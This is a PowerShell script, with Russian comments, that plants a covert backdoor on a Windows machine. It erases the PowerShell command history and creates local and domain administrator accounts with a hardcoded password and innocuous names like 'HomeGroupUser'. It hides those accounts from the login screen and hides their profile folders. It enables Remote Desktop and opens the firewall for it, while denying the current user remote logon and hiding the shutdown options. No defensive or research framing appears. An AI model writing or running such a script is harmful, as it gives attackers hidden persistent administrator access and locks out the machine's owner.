Clear-Host
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# Настройки пользователей
$userAccounts = @("HomeGroupUser", "Other user")
$password = "Its@not1t!"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$description = "A user account managed by the system."

# Получение имён групп из SID
$adminSID = "S-1-5-32-544"
$rdpSID   = "S-1-5-32-555"
$adminGroup = (New-Object System.Security.Principal.SecurityIdentifier($adminSID)).Translate([System.Security.Principal.NTAccount]).Value.Split('\')[1]
$rdpGroup   = (New-Object System.Security.Principal.SecurityIdentifier($rdpSID)).Translate([System.Security.Principal.NTAccount]).Value.Split('\')[1]

$anyCreated = $false

# Упрощённая функция без param()
function Add-LocalGroupMemberSafe ($Group, $Member) {
    try {
        Add-LocalGroupMember -Group $Group -Member $Member -ErrorAction Stop
    } catch {}
}

foreach ($user in $userAccounts) {
    try {
        # Создание локального пользователя, если он не существует
        if (-not (Get-LocalUser -Name $user -ErrorAction SilentlyContinue)) {
            try {
                New-LocalUser -Name $user -Password $securePassword -FullName $user -Description $description `
                              -PasswordNeverExpires:$true -AccountNeverExpires:$true -UserMayNotChangePassword:$false -ErrorAction Stop
            } catch {
                net user "$user" "$password" /add /comment:"$description" /expires:never /active:yes >$null 2>&1
            }
        }

        # Скрытие пользователя с экрана входа
        $reg = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
        if (-not (Test-Path $reg)) { New-Item -Path $reg -Force >$null }
        Set-ItemProperty -Path $reg -Name $user -Value 0

        # Добавление в группы
        $member = "$env:COMPUTERNAME\$user"
        Add-LocalGroupMemberSafe $adminGroup $member
        Add-LocalGroupMemberSafe $rdpGroup $member
        net localgroup "$adminGroup" "$member" /add /domain >$null 2>&1
        net localgroup "$rdpGroup"   "$member" /add /domain >$null 2>&1

        # Профиль пользователя
        $userPath = "$env:SystemDrive\Users\$user"
        if (-not (Test-Path $userPath)) {
            try {
                Copy-Item "$env:SystemDrive\Users\Default" $userPath -Recurse -ErrorAction Stop
            } catch {
                New-Item -ItemType Directory -Path $userPath | Out-Null
            }
        }
        attrib +h +s $userPath

        # Скрытая конфигурационная папка
        $confPath = "$env:SystemDrive\Users\$user.$env:COMPUTERNAME"
        if (-not (Test-Path $confPath)) {
            New-Item $confPath -ItemType Directory | Out-Null
        }
        attrib +h +s $confPath

        # Active Directory (опционально)
        try {
            Import-Module ActiveDirectory -ErrorAction Stop
            if (-not (Get-ADUser -Filter "SamAccountName -eq '$user'" -ErrorAction SilentlyContinue)) {
                New-ADUser -Name $user -SamAccountName $user `
                           -UserPrincipalName "$user@$env:USERDNSDOMAIN" `
                           -AccountPassword $securePassword -Enabled $true `
                           -Path 'OU=Users,DC=example,DC=com' -Description $description `
                           -PasswordNeverExpires $true
                net user "$user" "$password" /add /domain /comment:"$description" /expires:never /active:yes >$null 2>&1
            }
        } catch {}

        $anyCreated = $true
    } catch {}
}

# Если был создан хотя бы один пользователь — настройка прав
if (-not $anyCreated) { Exit }

$temp = "$env:TEMP\pol_temp"
$cfg  = "$temp\secpol.inf"
$db   = "$temp\secpol.sdb"

$currentSID = (New-Object System.Security.Principal.NTAccount("$env:USERDOMAIN\$env:USERNAME")).Translate([System.Security.Principal.SecurityIdentifier]).Value

New-Item -ItemType Directory -Path $temp -Force | Out-Null
secedit /export /cfg $cfg >$null

$lines = [System.Collections.Generic.List[string]]::new()
Get-Content $cfg -Encoding ASCII | ForEach-Object { $lines.Add($_) }

$idx = $lines.IndexOf('[Privilege Rights]')
if ($idx -ge 0) {
    $lines[$idx + 1] = "SeShutdownPrivilege = $adminSID"

    $denyIdx = $lines.FindIndex({ $_ -like 'SeDenyRemoteInteractiveLogonRight*' })
    if ($denyIdx -ge 0) {
        $lines[$denyIdx] = "SeDenyRemoteInteractiveLogonRight = $currentSID"
    } else {
        $lines.Insert($idx + 2, "SeDenyRemoteInteractiveLogonRight = $currentSID")
    }

    $lines | Set-Content $cfg -Encoding ASCII
    secedit /configure /db $db /cfg $cfg /areas USER_RIGHTS /quiet
}

Remove-Item -Recurse -Force $temp -ErrorAction SilentlyContinue

# Отключение кнопки выключения без входа
Set-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name ShutdownWithoutLogon -Value 0

# Скрытие кнопок питания
foreach ($opt in 'HideShutdown', 'HideSleep', 'HideHibernate') {
    Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Start\$opt" -Name Value -Value 1 -Type DWord -ErrorAction SilentlyContinue
}

# Включение удалённого доступа (RDP)
Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0
Enable-NetFirewallRule -DisplayGroup 'Remote Desktop' -ErrorAction SilentlyContinue
Set-Service TermService -StartupType Automatic
Start-Service TermService
